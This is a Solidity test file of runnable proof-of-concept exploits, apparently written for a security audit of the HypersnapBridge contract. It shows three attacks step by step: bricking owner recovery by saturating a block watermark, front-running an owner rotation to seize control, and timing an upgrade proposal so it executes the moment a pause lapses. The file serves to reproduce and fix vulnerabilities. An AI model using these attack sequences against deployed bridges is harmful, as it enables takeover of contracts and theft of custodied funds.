// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

import {BridgeTest} from "./utils/BridgeTest.sol";
import {HypersnapBridge} from "../src/HypersnapBridge.sol";

/// @title Residual5c25945
/// @notice Runnable PoCs demonstrating three still-live bridge-recovery
/// vulnerabilities are PRESENT in the post-fix commit
/// 5c2594563df84c374fdce7cdeae06d3444da3b72 ("audit fixes").
///
/// The Solidity contract `HypersnapBridge.sol` is unchanged from the audited
/// base in this commit; the only relevant "fix" was a Rust-side honest-signer
/// block-number cap that does NOT bind the contract. Each test below is a
/// positive reproduction: pass == bug demonstrated.
///
/// Single canonical deployment is assumed throughout (cross-deployment replay,
/// F045, is out of scope here).
///
/// Line references are to contracts/src/HypersnapBridge.sol @ this commit.
contract Residual5c25945 is BridgeTest {
    HypersnapBridge internal evilImpl;

    function setUp() public override {
        super.setUp();
        // A valid UUPS-compatible implementation the attacker wants to install.
        // (Using the bridge itself satisfies the proxiableUUID() guard at
        // L298-304; in a real attack this would be a custody-draining impl.)
        evilImpl = new HypersnapBridge();
    }

    // =====================================================================
    // F049 — watermark saturation bricks recovery; executeUpgrade survives.
    //
    // An owner-signed action with blockNumber = type(uint64).max saturates the
    // shared monotonic watermark `latestBlock` (L90). Thereafter rotateOwner
    // (gate L235), cancelUpgrade (gate L321) and pause (gate L362) all revert
    // StaleBlock because no uint64 can be strictly greater than 2^64-1.
    // Meanwhile a pending implementation proposed before saturation still fires
    // via the permissionless, watermark-independent executeUpgrade() (L346-355).
    //
    // The contract has NO upper bound on blockNumber on any entry point — the
    // only "fix" was Rust-side and is irrelevant to a Byzantine/compromised
    // signer (in this test we hold the owner key directly).
    // =====================================================================
    function test_F049_watermarkSaturationBricksRecovery_executeUpgradeSurvives() public {
        uint64 MAX = type(uint64).max; // 2^64 - 1

        // 1. Attacker (holding owner key) lands a malicious pending upgrade at
        //    a low block. effectiveAt = now + 48h. latestBlock = 10.
        bridge.proposeUpgrade(10, address(evilImpl), _signUpgrade(10, address(evilImpl), OWNER_PK));
        assertEq(bridge.pendingImplementation(), address(evilImpl));
        uint64 effectiveAt = bridge.pendingUpgradeEffectiveAt();

        // 2. Attacker saturates the watermark with a single pause at MAX.
        //    The contract accepts it: NO upper bound exists at L362.
        bridge.pause(MAX, _signPause(MAX, OWNER_PK));
        assertEq(bridge.latestBlock(), MAX, "watermark saturated to uint64 max");

        // 3. The documented key-compromise recovery (L266-270) is now permanently
        //    bricked. Even a fresh, clean key (NEW_OWNER_PK) cannot be installed
        //    and the pending upgrade cannot be cancelled, because NO blockNumber
        //    can satisfy `blockNumber > latestBlock` once latestBlock == MAX.

        // (a) rotateOwner reverts StaleBlock for the maximal possible block (MAX).
        //     Gate at L235. There is no valid X, so recovery rotation is impossible.
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.rotateOwner(
            MAX,
            newOwnerEOA,
            _signOwnerUpdate(MAX, newOwnerEOA, OWNER_PK),
            _signOwnerAcceptance(newOwnerEOA, NEW_OWNER_PK)
        );

        // (b) cancelUpgrade reverts StaleBlock. Gate at L321. The malicious
        //     pending upgrade can never be cancelled.
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.cancelUpgrade(MAX, address(evilImpl), _signUpgradeCancel(MAX, address(evilImpl), OWNER_PK));

        // (c) pause reverts StaleBlock. Gate at L362. Defenders cannot even
        //     extend/refresh the pause to keep executeUpgrade locked out.
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, MAX, MAX));
        bridge.pause(MAX, _signPause(MAX, OWNER_PK));

        // 4. The pause from step 2 lasts 72h and the upgrade is ready at 48h.
        //    Warp past pause expiry (auto-expires; no unpause path) and past the
        //    upgrade-ready instant. executeUpgrade() consults ONLY
        //    pendingImplementation / pendingUpgradeEffectiveAt / pauseExpiry —
        //    NEVER latestBlock — so the saturated watermark does not stop it.
        uint64 pauseExpiry = bridge.pauseExpiry();
        assertGt(pauseExpiry, effectiveAt, "pause (72h) outlasts upgrade-ready (48h)");
        vm.warp(pauseExpiry); // pause inactive (block.timestamp == pauseExpiry, L166 strict <)

        // Anyone can call it — permissionless (L346). Have the attacker do it.
        vm.prank(attackerEOA);
        bridge.executeUpgrade();

        // The proxy implementation has been swapped to the attacker's impl.
        assertEq(bridge.pendingImplementation(), address(0), "pending cleared = upgrade executed");
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; // ERC-1967 impl slot
        address installed = address(uint160(uint256(vm.load(address(bridge), implSlot))));
        assertEq(installed, address(evilImpl), "attacker implementation installed despite bricked recovery");
    }

    // =====================================================================
    // F047 — owner-rotation front-run defeats key-compromise recovery.
    //
    // Cleanest variant: SEIZURE. A compromised old owner (holds O1 = OWNER_PK)
    // can front-run the victim's recovery rotateOwner(N, O2, sigByO1) by landing
    // their OWN rotateOwner(N, O_attacker, authSigByO1, acceptSigByO_attacker)
    // first. rotateOwner shares the watermark namespace with no priority and the
    // authorization digest binds ONLY (DOMAIN, block, newOwner) (L238-242) — not
    // the current owner — so O1 can authorize a rotation to any address. The
    // acceptance digest binds ONLY the newOwner (L247-250), trivially produced by
    // the attacker for their own key.
    //
    // Result: ownerAddress becomes O_attacker permanently, and the victim's
    // legitimate rotation to O2 at the same block N now reverts StaleBlock.
    // =====================================================================
    function test_F047_rotationFrontRun_attackerSeizesOwnership() public {
        // Scenario: O1 (OWNER_PK) is compromised. Validators run a fresh DKG,
        // obtain clean key O2 (NEW_OWNER_PK), and broadcast a recovery rotation
        // at block N. The rotation tx and its digests are public in the mempool.
        uint64 N = 5;

        // Pre-sign the victim's legitimate recovery rotation (block N -> O2).
        bytes memory victimAuth = _signOwnerUpdate(N, newOwnerEOA, OWNER_PK);   // authorized by O1
        bytes memory victimAccept = _signOwnerAcceptance(newOwnerEOA, NEW_OWNER_PK); // accepted by O2

        // Attacker controls O_attacker (ATTACKER_PK) and still holds O1.
        // They sign their OWN rotation at the SAME block N to their own address.
        // - authorization: O1 signs (block N, O_attacker)  -> recovers to ownerAddress (O1) at L243
        // - acceptance:    O_attacker signs (O_attacker)   -> recovers to newOwner at L251
        bytes memory atkAuth = _signOwnerUpdate(N, attackerEOA, OWNER_PK);
        bytes memory atkAccept = _signOwnerAcceptance(attackerEOA, ATTACKER_PK);

        // Attacker wins the mempool race (higher fee) and lands first.
        vm.prank(attackerEOA);
        bridge.rotateOwner(N, attackerEOA, atkAuth, atkAccept);

        // ownerAddress is now the attacker — permanent seizure (L256).
        assertEq(bridge.ownerAddress(), attackerEOA, "attacker seized ownership");
        assertEq(bridge.latestBlock(), N, "watermark consumed at N by attacker");

        // The victim's legitimate recovery rotation at the same block N now
        // reverts StaleBlock (gate L235: N <= latestBlock == N). The defenders'
        // documented "immediate, no delay" recovery is defeated.
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.StaleBlock.selector, N, N));
        bridge.rotateOwner(N, newOwnerEOA, victimAuth, victimAccept);

        // Even re-signing at N+1, the attacker can repeat the front-run; but the
        // single-won-race seizure above already makes them the sole owner, and
        // every subsequent universal action must be signed by O_attacker now.
        // Confirm the attacker can drive the control plane (e.g. pause) and the
        // original owner O1's signature is no longer accepted.
        vm.expectRevert(HypersnapBridge.BadOwnerSignature.selector);
        bridge.pause(N + 1, _signPause(N + 1, OWNER_PK)); // O1 no longer owner
    }

    // =====================================================================
    // F048 — pause does not gate proposeUpgrade.
    //
    // proposeUpgrade (L271-311) has NO whenNotPaused modifier (cf. claim L182,
    // burn L380, executeUpgrade L346). An attacker can therefore land a malicious
    // propose DURING an active pause and choose the propose timestamp so that
    // effectiveAt (= T_prop + 48h) lands at/after pauseExpiry, collapsing the
    // documented "24h guaranteed lockout" cushion (L64-71) to zero.
    //
    // PAUSE_DURATION = 72h, UPGRADE_DELAY = 48h. Defender pauses at T=0
    // (pauseExpiry = 72h). Attacker proposes at T = 24h (still inside pause):
    // effectiveAt = 24h + 48h = 72h == pauseExpiry. Both the pause gate and the
    // upgrade-ready gate clear at exactly block.timestamp == 72h, so the attacker
    // executes in the same block the pause lapses. Defender cushion = 0h.
    // =====================================================================
    function test_F048_pauseDoesNotGateProposeUpgrade_lockoutDefeated() public {
        uint256 T0 = block.timestamp;

        // Defender lands a defensive pause at T0. pauseExpiry = T0 + 72h.
        bridge.pause(1, _signPause(1, OWNER_PK));
        uint64 pauseExpiry = bridge.pauseExpiry();
        assertEq(pauseExpiry, uint64(T0) + 72 hours, "pause lasts 72h");

        // Sanity: the pause IS active right now, so claim/burn/executeUpgrade are
        // gated. But proposeUpgrade is NOT gated. Attacker waits inside the pause
        // window and proposes late, at T0 + 24h (= pauseExpiry - 48h).
        vm.warp(T0 + 24 hours);
        assertTrue(block.timestamp < pauseExpiry, "still inside active pause window");

        // KEY ASSERTION: proposeUpgrade does NOT revert while paused (no
        // whenNotPaused at L271-311). If the fix were present this call would
        // revert BridgePaused; it succeeds.
        bridge.proposeUpgrade(2, address(evilImpl), _signUpgrade(2, address(evilImpl), OWNER_PK));
        assertEq(bridge.pendingImplementation(), address(evilImpl), "propose succeeded while paused");

        uint64 effectiveAt = bridge.pendingUpgradeEffectiveAt();

        // Timing proof: effectiveAt == pauseExpiry. The documented 24h cushion
        // (the window [effectiveAt, pauseExpiry) in which executeUpgrade is
        // pause-blocked but upgrade-ready, giving validators time to cancel) is
        // exactly zero — both gates clear at the same instant.
        assertEq(effectiveAt, uint64(T0) + 72 hours, "effectiveAt = T_prop+48h = T0+72h");
        assertEq(effectiveAt, pauseExpiry, "effectiveAt == pauseExpiry => cushion collapsed to ZERO");

        // At any instant strictly before pauseExpiry, executeUpgrade is blocked
        // by the pause AND not yet ready (both fail). One second before:
        vm.warp(uint256(pauseExpiry) - 1);
        vm.expectRevert(abi.encodeWithSelector(HypersnapBridge.BridgePaused.selector, pauseExpiry));
        bridge.executeUpgrade();

        // At the exact instant the pause lapses, the upgrade is simultaneously
        // ready (block.timestamp >= effectiveAt) and unpaused
        // (block.timestamp == pauseExpiry, L166 strict <), so the attacker
        // executes in the very block the pause expires. Zero defender cushion.
        vm.warp(pauseExpiry);
        vm.prank(attackerEOA);
        bridge.executeUpgrade();
        assertEq(bridge.pendingImplementation(), address(0), "attacker executed upgrade at pause lapse, 0h cushion");
    }
}
